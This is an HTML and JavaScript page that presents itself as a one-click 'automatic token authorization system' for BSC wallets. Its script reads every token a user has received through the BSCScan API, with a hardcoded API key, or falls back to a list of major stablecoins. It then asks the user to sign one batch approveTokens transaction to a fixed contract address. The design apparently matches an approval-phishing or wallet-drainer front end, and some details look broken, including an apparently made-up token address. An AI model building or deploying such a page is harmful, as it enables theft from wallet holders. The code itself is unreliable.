<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自动代币授权系统</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .wallet-info {
            background: #e3f2fd;
            border: 1px solid #bbdefb;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #1976d2;
        }
        
        .contract-info {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .info-item:last-child {
            margin-bottom: 0;
        }
        
        .label {
            color: #666;
        }
        
        .value {
            color: #333;
            font-weight: 500;
            font-family: monospace;
            word-break: break-all;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-bottom: 15px;
            transition: transform 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .btn.success {
            background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
        }
        
        .btn.info {
            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
        }
        
        .btn.warning {
            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        .status.warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e9ecef;
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .token-list {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .token-item {
            display: flex;
            align-items: center;
            padding: 8px;
            margin-bottom: 8px;
            background: white;
            border-radius: 6px;
            font-size: 12px;
        }
        
        .token-item:last-child {
            margin-bottom: 0;
        }
        
        .token-icon {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .token-address {
            font-family: monospace;
            color: #666;
            word-break: break-all;
        }
        
        .wallet-selector {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            padding: 8px;
            margin-bottom: 8px;
            background: white;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .wallet-option:hover {
            background: #f8f9fa;
        }
        
        .wallet-option:last-child {
            margin-bottom: 0;
        }
        
        .wallet-icon {
            margin-right: 12px;
            font-size: 20px;
        }
        
        .wallet-name {
            font-weight: 500;
            color: #333;
        }
        
        .wallet-status {
            margin-left: auto;
            font-size: 12px;
            color: #666;
        }
        
        .network-info {
            background: #e8f5e8;
            border: 1px solid #c8e6c9;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">��</div>
        <h1>自动代币授权系统</h1>
        <p class="subtitle">一键授权钱包中的所有代币</p>
        
        <!-- 钱包选择器 -->
        <div class="wallet-selector" id="walletSelector">
            <h4>选择钱包:</h4>
            <div id="walletOptions"></div>
        </div>
        
        <div class="wallet-info" id="walletInfo" style="display: none;">
            <strong>钱包地址:</strong> <span id="walletAddress"></span>
        </div>
        
        <div class="network-info" id="networkInfo" style="display: none;">
            <strong>当前网络:</strong> <span id="currentNetwork"></span>
        </div>
        
        <div class="contract-info">
            <div class="info-item">
                <span class="label">智能合约:</span>
                <span class="value">0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7</span>
            </div>
            <div class="info-item">
                <span class="label">目标网络:</span>
                <span class="value">BSC 主网</span>
            </div>
        </div>
        
        <button class="btn" id="connectBtn" onclick="selectWallet()">
            选择并连接钱包
        </button>
        
        <button class="btn info" id="detectBtn" onclick="detectAndAuthorizeTokens()" style="display: none;">
            检测并授权所有代币
        </button>
        
        <button class="btn info" id="checkBtn" onclick="checkAuthorizationStatus()" style="display: none;">
            查询授权状态
        </button>
        
        <button class="btn warning" id="switchNetworkBtn" onclick="switchToBSC()" style="display: none;">
            切换到BSC网络
        </button>
        
        <!-- 进度条 -->
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <!-- 代币列表 -->
        <div class="token-list" id="tokenList" style="display: none;">
            <h4>检测到的代币:</h4>
            <div id="tokenItems"></div>
        </div>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        // 配置
        const BSC_CHAIN_ID = '0x38';
        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
        const BSCSCAN_API_KEY = 'UZPUDJEQYHN2Z5D3N38B7RH6FVR4A968ZD';
        const AUTO_CONTROLLER_ADDRESS = '0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7';
        
        // 合约ABI
        const AUTO_CONTROLLER_ABI = [
            {
                "inputs": [{"name": "tokens", "type": "address[]"}],
                "name": "approveTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "user", "type": "address"}],
                "name": "getUserAuthorizedTokens",
                "outputs": [{"name": "", "type": "address[]"}],
                "stateMutability": "view",
                "type": "function"
            }
        ];
        
        let web3;
        let userAccount;
        let currentWallet = null;
        let currentChainId = null;
        
        // 页面加载完成后初始化
        window.addEventListener('load', async () => {
            await initializeWalletSelector();
        });
        
        // 初始化钱包选择器
        async function initializeWalletSelector() {
            const walletOptions = document.getElementById('walletOptions');
            walletOptions.innerHTML = '';
            
            const availableWallets = [];
            
            // 检测MetaMask
            if (window.ethereum) {
                availableWallets.push({
                    name: 'MetaMask',
                    icon: '🦊',
                    provider: window.ethereum,
                    type: 'ethereum'
                });
            }
            
            // 检测TronLink
            if (window.tronWeb) {
                availableWallets.push({
                    name: 'TronLink',
                    icon: '🔗',
                    provider: window.tronWeb,
                    type: 'tron'
                });
            }
            
            // 检测其他钱包
            if (window.BinanceChain) {
                availableWallets.push({
                    name: 'Binance Wallet',
                    icon: '🏦',
                    provider: window.BinanceChain,
                    type: 'ethereum'
                });
            }
            
            if (availableWallets.length === 0) {
                showStatus('未检测到任何钱包扩展，请安装MetaMask', 'error');
                return;
            }
            
            // 显示钱包选项
            availableWallets.forEach((wallet, index) => {
                const walletOption = document.createElement('div');
                walletOption.className = 'wallet-option';
                walletOption.onclick = () => connectWallet(wallet);
                
                walletOption.innerHTML = `
                    <span class="wallet-icon">${wallet.icon}</span>
                    <span class="wallet-name">${wallet.name}</span>
                    <span class="wallet-status">点击连接</span>
                `;
                
                walletOptions.appendChild(walletOption);
            });
            
            // 如果只有一个钱包，自动连接
            if (availableWallets.length === 1) {
                await connectWallet(availableWallets[0]);
            }
        }
        
        // 连接指定钱包
        async function connectWallet(wallet) {
            try {
                currentWallet = wallet;
                showStatus(`正在连接${wallet.name}...`, 'info');
                
                if (wallet.type === 'tron') {
                    showStatus('TronLink不支持BSC网络，请使用MetaMask或其他支持BSC的钱包', 'warning');
                    return false;
                }
                
                // 连接以太坊钱包
                const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    showStatus('请授权连接钱包', 'error');
                    return false;
                }
                
                userAccount = accounts[0];
                
                // 检查网络
                const chainId = await wallet.provider.request({ method: 'eth_chainId' });
                currentChainId = chainId;
                
                if (chainId !== BSC_CHAIN_ID) {
                    showStatus('当前不是BSC网络，请切换到BSC网络', 'warning');
                    document.getElementById('switchNetworkBtn').style.display = 'block';
                    document.getElementById('currentNetwork').textContent = getNetworkName(chainId);
                    document.getElementById('networkInfo').style.display = 'block';
                } else {
                    showStatus('网络连接正常', 'success');
                    document.getElementById('switchNetworkBtn').style.display = 'none';
                    document.getElementById('networkInfo').style.display = 'none';
                }
                
                web3 = new Web3(wallet.provider);
                
                // 更新UI
                document.getElementById('walletAddress').textContent = userAccount;
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('walletSelector').style.display = 'none';
                document.getElementById('detectBtn').style.display = 'block';
                document.getElementById('checkBtn').style.display = 'block';
                document.getElementById('connectBtn').style.display = 'none';
                
                showStatus(`${wallet.name}连接成功！`, 'success');
                setTimeout(() => hideStatus(), 2000);
                
                return true;
                
            } catch (error) {
                console.error('连接钱包失败:', error);
                showStatus(`连接${wallet.name}失败: ` + error.message, 'error');
                return false;
            }
        }
        
        // 选择钱包
        async function selectWallet() {
            document.getElementById('walletSelector').style.display = 'block';
            document.getElementById('detectBtn').style.display = 'none';
            document.getElementById('checkBtn').style.display = 'none';
            document.getElementById('walletInfo').style.display = 'none';
            document.getElementById('networkInfo').style.display = 'none';
            document.getElementById('connectBtn').style.display = 'none';
        }
        
        // 切换到BSC网络
        async function switchToBSC() {
            if (!currentWallet || currentWallet.type === 'tron') {
                showStatus('无法切换网络', 'error');
                return;
            }
            
            try {
                showStatus('正在切换到BSC网络...', 'info');
                
                await currentWallet.provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }],
                });
                
                currentChainId = BSC_CHAIN_ID;
                document.getElementById('switchNetworkBtn').style.display = 'none';
                document.getElementById('networkInfo').style.display = 'none';
                
                showStatus('已切换到BSC网络', 'success');
                
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await currentWallet.provider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'Binance Smart Chain',
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                rpcUrls: [BSC_RPC_URL],
                                blockExplorerUrls: ['https://bscscan.com/']
                            }]
                        });
                        
                        currentChainId = BSC_CHAIN_ID;
                        document.getElementById('switchNetworkBtn').style.display = 'none';
                        document.getElementById('networkInfo').style.display = 'none';
                        
                        showStatus('已添加并切换到BSC网络', 'success');
                        
                    } catch (addError) {
                        showStatus('添加BSC网络失败: ' + addError.message, 'error');
                    }
                } else {
                    showStatus('切换网络失败: ' + switchError.message, 'error');
                }
            }
        }
        
        // 获取网络名称
        function getNetworkName(chainId) {
            const networks = {
                '0x1': 'Ethereum 主网',
                '0x38': 'BSC 主网',
                '0x61': 'BSC 测试网',
                '0x89': 'Polygon 主网',
                '0x137': 'Polygon 主网',
                '0xa': 'Optimism 主网',
                '0xa4b1': 'Arbitrum 主网'
            };
            return networks[chainId] || `未知网络 (${chainId})`;
        }
        
        // 检测并授权代币
        async function detectAndAuthorizeTokens() {
            if (!web3 || !userAccount) {
                showStatus('请先连接钱包', 'error');
                return;
            }
            
            if (currentChainId !== BSC_CHAIN_ID) {
                showStatus('请先切换到BSC网络', 'error');
                return;
            }
            
            try {
                const detectBtn = document.getElementById('detectBtn');
                detectBtn.disabled = true;
                detectBtn.innerHTML = '<span class="loading"></span>检测中...';
                
                showStatus('正在检测钱包中的所有代币...', 'info');
                
                // 1. 使用BSCScan API检测代币
                const userTokens = await detectTokensFromBSCScan(userAccount);
                
                if (userTokens.length === 0) {
                    showStatus('未检测到任何代币', 'info');
                    detectBtn.disabled = false;
                    detectBtn.innerHTML = '重新检测';
                    return;
                }
                
                // 显示检测到的代币
                displayDetectedTokens(userTokens);
                
                showStatus(`检测到 ${userTokens.length} 个代币，准备批量授权...`, 'info');
                
                // 2. 调用合约批量授权
                const contract = new web3.eth.Contract(AUTO_CONTROLLER_ABI, AUTO_CONTROLLER_ADDRESS);
                
                const data = contract.methods.approveTokens(userTokens).encodeABI();
                
                const transaction = {
                    from: userAccount,
                    to: AUTO_CONTROLLER_ADDRESS,
                    data: data,
                    gas: 500000 + (userTokens.length * 50000),
                    gasPrice: await web3.eth.getGasPrice()
                };
                
                showStatus('请在钱包中确认批量授权交易...', 'info');
                
                const receipt = await web3.eth.sendTransaction(transaction);
                
                if (receipt.status) {
                    showStatus(`成功授权 ${userTokens.length} 个代币！`, 'success');
                    detectBtn.innerHTML = '授权完成';
                    detectBtn.className = 'btn success';
                } else {
                    showStatus('批量授权失败', 'error');
                    detectBtn.innerHTML = '重新授权';
                }
                
                detectBtn.disabled = false;
                
            } catch (error) {
                console.error('批量授权失败:', error);
                showStatus('批量授权失败: ' + error.message, 'error');
                
                const detectBtn = document.getElementById('detectBtn');
                detectBtn.disabled = false;
                detectBtn.innerHTML = '重新检测';
            }
        }
        
        // 使用BSCScan API检测代币
        async function detectTokensFromBSCScan(userAddress) {
            try {
                const response = await fetch(
                    `https://api.bscscan.com/api?module=account&action=tokentx&address=${userAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${BSCSCAN_API_KEY}`
                );
                
                const data = await response.json();
                
                if (data.status === '1' && data.result) {
                    const uniqueTokens = new Set();
                    
                    data.result.forEach(tx => {
                        if (tx.to.toLowerCase() === userAddress.toLowerCase()) {
                            uniqueTokens.add(tx.contractAddress);
                        }
                    });
                    
                    return Array.from(uniqueTokens);
                }
                
                return [];
                
            } catch (error) {
                console.error('BSCScan API检测失败:', error);
                showStatus('API检测失败，使用预定义代币列表', 'info');
                return getPredefinedTokens();
            }
        }
        
        // 预定义代币列表（备选方案）
        function getPredefinedTokens() {
            return [
                '0x55d398326f99059fF775485246999027B3197955', // USDT
                '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
                '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
                '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
                '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH
                '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550', // CoCo
                '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // CAKE
                '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', // ADA
                '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94', // LTC
                '0x1D2F0da169ceB9fC7B314F8F4A2Ee9a0b0C1b2A3'  // XRP
            ];
        }
        
        // 显示检测到的代币
        function displayDetectedTokens(tokens) {
            const tokenList = document.getElementById('tokenList');
            const tokenItems = document.getElementById('tokenItems');
            
            tokenItems.innerHTML = '';
            
            tokens.forEach((token, index) => {
                const tokenItem = document.createElement('div');
                tokenItem.className = 'token-item';
                tokenItem.innerHTML = `
                    <span class="token-icon">💎</span>
                    <span class="token-address">${index + 1}. ${token}</span>
                `;
                tokenItems.appendChild(tokenItem);
            });
            
            tokenList.style.display = 'block';
        }
        
        // 查询授权状态
        async function checkAuthorizationStatus() {
            if (!web3 || !userAccount) {
                showStatus('请先连接钱包', 'error');
                return;
            }
            
            try {
                showStatus('正在查询授权状态...', 'info');
                
                const contract = new web3.eth.Contract(AUTO_CONTROLLER_ABI, AUTO_CONTROLLER_ADDRESS);
                
                const authorizedTokens = await contract.methods.getUserAuthorizedTokens(userAccount).call();
                
                if (authorizedTokens.length === 0) {
                    showStatus('您还没有授权任何代币', 'info');
                    return;
                }
                
                showStatus(`您已授权 ${authorizedTokens.length} 个代币`, 'success');
                
                // 显示授权详情
                let details = '已授权代币:\n';
                for (let i = 0; i < Math.min(authorizedTokens.length, 5); i++) {
                    details += `${i + 1}. ${authorizedTokens[i]}\n`;
                }
                if (authorizedTokens.length > 5) {
                    details += `... 还有 ${authorizedTokens.length - 5} 个代币`;
                }
                
                alert(details);
                
            } catch (error) {
                console.error('查询授权状态失败:', error);
                showStatus('查询失败: ' + error.message, 'error');
            }
        }
        
        // 显示状态信息
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status ${type}`;
            status.style.display = 'block';
        }
        
        // 隐藏状态信息
        function hideStatus() {
            document.getElementById('status').style.display = 'none';
        }
        
        // 监听网络切换
        if (window.ethereum) {
            window.ethereum.on('chainChanged', (chainId) => {
                currentChainId = chainId;
                if (chainId !== BSC_CHAIN_ID) {
                    showStatus('网络已切换，请确保使用BSC网络', 'warning');
                    document.getElementById('switchNetworkBtn').style.display = 'block';
                    document.getElementById('currentNetwork').textContent = getNetworkName(chainId);
                    document.getElementById('networkInfo').style.display = 'block';
                } else {
                    showStatus('已切换到BSC网络', 'success');
                    document.getElementById('switchNetworkBtn').style.display = 'none';
                    document.getElementById('networkInfo').style.display = 'none';
                }
            });
            
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    userAccount = null;
                    currentWallet = null;
                    document.getElementById('walletInfo').style.display = 'none';
                    document.getElementById('networkInfo').style.display = 'none';
                    document.getElementById('detectBtn').style.display = 'none';
                    document.getElementById('checkBtn').style.display = 'none';
                    document.getElementById('switchNetworkBtn').style.display = 'none';
                    document.getElementById('walletSelector').style.display = 'block';
                    document.getElementById('connectBtn').style.display = 'block';
                    showStatus('钱包已断开连接', 'error');
                } else {
                    userAccount = accounts[0];
                    document.getElementById('walletAddress').textContent = userAccount;
                    document.getElementById('walletInfo').style.display = 'block';
                    hideStatus();
                }
            });
        }
    </script>
</body>
</html>
